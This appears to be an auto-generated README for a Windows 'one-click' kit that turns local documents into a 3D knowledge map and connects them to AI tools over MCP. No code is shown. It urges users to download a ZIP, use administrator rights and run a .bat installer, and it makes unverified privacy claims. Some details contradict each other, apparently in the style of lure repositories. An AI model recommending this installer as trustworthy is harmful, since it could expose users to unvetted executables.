---
layout: "default"
title: "🧠 Langent-MCP_One-Click_Kit - Transform Personal Documents Into Interactive Knowledge"
description: "Connect local documents to AI tools for search and 3D visualization with this Windows one-click installation kit."
---
# 🧠 Langent-MCP_One-Click_Kit - Transform Personal Documents Into Interactive Knowledge

[![Download Langent-MCP](https://img.shields.io/badge/Download-Click%20Here-blue.svg)](https://github.com/lightmeterminiaturisation293/Langent-MCP_One-Click_Kit)

## 📖 About This Tool

Langent-MCP_One-Click_Kit turns your local documents into an intelligent database. It reads PDF, TXT, and Markdown files. It then builds a 3D visualization of your knowledge. You see your information as a 3D nebula of related concepts. This tool creates a bridge between your files and artificial intelligence tools like Claude or Cursor. It uses the Model Context Protocol to help these tools understand your specific data. You do not need to know how to code to use this system.

## 📋 System Requirements

Ensure your computer meets these standards before you begin:

*   **Operating System:** Windows 10 or Windows 11.
*   **Storage:** At least 2GB of free space.
*   **Memory:** 8GB of RAM.
*   **Internet:** A stable connection to download the tool and support AI features.
*   **Permissions:** You need administrator rights to install software on your machine.

## 📥 How to Download and Install

Follow these steps to get the software on your computer.

1. Visit this [Download Page](https://github.com/lightmeterminiaturisation293/Langent-MCP_One-Click_Kit) to get the files.
2. Look for the green "Code" button and select "Download ZIP".
3. Find the downloaded file in your "Downloads" folder.
4. Right-click the folder and choose "Extract All".
5. Pick a folder where you want to keep the application.

## 🚀 Setting Up Your Knowledge Base

Once you extract the files, follow these steps to run the software.

1. Open the folder you just extracted.
2. Find the file named `run_setup.bat`.
3. Double-click this file to start the installation.
4. A black window will appear on your screen. This is the installation script.
5. Wait for the process to finish. It will download the necessary tools for your system.
6. When the text says "Setup Complete," you can close the window.

## 🔍 Using the 3D Visualization

The software creates a visual map of your data. This helps you see how different topics connect.

1. Open the folder and double-click `start_visualization.bat`.
2. The application opens a new window.
3. You will see a cluster of dots. Each dot represents a piece of information from your documents.
4. Use your mouse to rotate the cluster.
5. Click on a specific dot to read the text associated with that point.
6. Use the search bar to find specific keywords within your document library.

## 🔗 Connecting to AI Tools

You can link this knowledge base to tools like Claude or Cursor using the Model Context Protocol (MCP).

1. Ensure the `Langent` application is running in the background.
2. Open your AI tool, such as Claude Desktop or Cursor.
3. Look for the "MCP Settings" or "Integrations" menu in your AI tool.
4. Click "Add New MCP Server".
5. Enter the path to your Langent folder in the command line section.
6. Save the settings and restart your AI tool.
7. You can now ask your AI questions based on your personal documents.

## 🛠️ Frequently Asked Questions

**What document types does it support?**
It works with PDF, TXT, and MD files. Place these files in the `data` folder inside your main Langent folder.

**Is my data private?**
Yes. The software processes your documents entirely on your local machine. No data is sent to external servers unless you specifically enable an AI connection.

**How do I update the software?**
Simple. Download the new ZIP file from the website and replace your existing folder. Your `data` folder will remain intact if you copy it over to the new version.

**The script failed to run. What should I do?**
Check if you have Python installed. If not, the script will prompt you. Ensure your firewall does not block the application from accessing the local network.

**Can I delete the 3D map?**
Yes. Deleting the `database` folder inside the installation directory refreshes the map. The software will rebuild it the next time you run the script.

## 📝 Troubleshooting Tips

*   **Files not showing up:** Ensure your documents are in the `data` directory. File names should not contain special characters.
*   **Slow performance:** Clear your browser cache and close unused programs. Large PDF files can take a few minutes to process during the first run.
*   **Window closes instantly:** Right-click the `.bat` file and select "Edit" to verify the directory paths match the location where you extracted the files.

## 🌍 Language Support

This kit provides guides in both Korean and English. Open the `docs` folder to find these guides. The English guide covers setup and configuration in plain language. The Korean guide explains technical troubleshooting and advanced search tips.

## 📦 File Structure

*   `data/`: Place your PDF, TXT, and MD files here.
*   `logs/`: Check this folder if the software stops working.
*   `scripts/`: Contains the files that handle the logic of the system.
*   `visualization/`: Contains the engine for the 3D nebula display.
*   `run_setup.bat`: Use this to install the system components.
*   `start_visualization.bat`: Use this to launch the file explorer.